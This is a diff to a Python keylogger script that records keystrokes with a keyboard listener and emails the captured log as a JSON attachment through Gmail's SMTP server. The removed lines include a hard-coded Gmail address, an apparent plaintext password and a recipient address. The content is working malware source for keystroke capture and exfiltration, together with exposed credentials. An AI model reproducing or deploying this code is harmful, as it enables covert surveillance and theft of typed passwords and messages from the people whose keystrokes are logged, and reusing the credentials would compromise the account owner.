@@ -39,9 +39,10 @@ def send_email(email, password, receiver, subject = '(no subject)'):
     msg['Subject'] = subject
     msg['To'] = receiver
 
-    with open(json_file_path) as myfile:
-        data = myfile.read()
-        msg.set_content(data)
+    with open(json_file_path, "rb") as myfile:
+        file_data = myfile.read()
+        file_name = myfile.name
+        msg.add_attachment(file_data, maintype = "application", subtype = 'json', filename = file_name)
 
     with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
@@ -56,9 +57,6 @@ print(
 )
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    Timer(5, listener.stop).start()
+    Timer(8, listener.stop).start()
     listener.join()
     print("[-] Keylogger finalizado!")
-
-send_email('mcpozebaiano@gmail.com', 'mcpozedorodo',
-           'd.lima@aln.senaicimatec.edu.br', 'keylogger')
